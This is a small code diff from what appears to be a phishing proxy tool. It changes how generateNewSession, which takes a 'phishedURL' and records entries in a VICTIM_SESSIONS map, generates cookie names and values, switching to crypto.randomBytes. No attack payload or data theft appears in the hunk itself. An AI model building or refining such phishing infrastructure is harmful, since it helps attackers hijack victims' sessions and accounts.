@@ -717,8 +717,11 @@ function createSessionLogFile(logFilename, currentSession) {
 }
 
 function generateNewSession(phishedURL) {
-  const cookieName = generateRandomString(12);
-  const cookieValue = generateRandomString(32);
+  // const cookieName = generateRandomString(12);
+  // const cookieValue = generateRandomString(32);
+
+  const cookieName = `session_${crypto.randomBytes(16).toString("hex")}`;
+  const cookieValue = crypto.randomBytes(32).toString("hex");
 
   VICTIM_SESSIONS[cookieName] = {};
   VICTIM_SESSIONS[cookieName].value = cookieValue;
